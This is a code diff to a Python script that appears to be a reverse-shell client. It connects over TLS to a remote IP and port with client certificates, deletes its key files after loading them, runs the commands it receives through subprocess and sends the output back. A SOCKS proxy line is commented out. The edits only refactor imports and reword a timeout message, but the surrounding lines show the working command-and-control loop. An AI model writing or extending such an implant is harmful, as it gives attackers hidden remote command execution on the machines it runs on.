@@ -1,5 +1,7 @@
 #!/usr/bin/python3
-import socket, platform, ssl, subprocess
+from socket import socket,AF_INET,SOCK_STREAM,SO_KEEPALIVE,SOL_SOCKET
+from ssl import create_default_context,Purpose
+import platform, ssl, subprocess
 from printlib import *
 from importlib import util
 from time import time, sleep
@@ -248,12 +250,12 @@ def callback_port(conn,data):
 def connect(remote_ip=remote_ip, remote_port=remote_port):
 
     data = ""
-    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile='server_cert')
+    context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
+    s = socket(AF_INET, SOCK_STREAM)
+    x = s.getsockopt( SOL_SOCKET, SO_KEEPALIVE)
     #s.settimeout(4)
     #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
@@ -339,7 +341,9 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     else:
                         send_data(conn, output.stdout.decode('utf-8')) # send back the result
                 except subprocess.TimeoutExpired:
-                    send_data(conn, "Timeout Expired!")
+                    if VERBOSE:
+                        print_warn("Command Execution Timeout Expired")
+                    send_data(conn, "Command Execution Timeout Expired")
                 except Exception as e:
                     if VERBOSE:
                         print_fail("Exception! --> {}".format(e))
